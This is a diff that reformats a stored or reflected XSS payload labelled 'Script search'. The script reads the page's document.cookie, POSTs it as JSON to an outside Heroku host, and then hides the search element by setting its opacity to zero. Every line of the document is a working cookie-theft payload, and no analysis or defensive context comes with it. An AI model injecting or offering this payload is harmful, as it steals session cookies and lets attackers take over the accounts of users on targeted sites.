@@ -1,19 +1,17 @@
-- Script search:
-
 <script>
-	const value = document.cookie;
-	const content = {"content" : value};
-	fetch('https://ptitterm4.herokuapp.com/',{
-  		"method" : "POST",
-  		"body" : JSON.stringify(content),
-  		"headers" : {
-      		'Accept': 'application/json',
-      		'Content-Type': 'application/json'
-    	}
-	});
+const value = document.cookie;
+const content = {"content" : value};
+fetch('https://ptitterm4.herokuapp.com/',{
+  "method" : "POST",
+  "body" : JSON.stringify(content),
+  "headers" : {
+      'Accept': 'application/json',
+      'Content-Type': 'application/json'
+    }
+});
 
-	const b = document.getElementById("search");
-	b.style.opacity = 0;
+const b = document.getElementById("search");
+b.style.opacity = 0;
 </script>
 
 
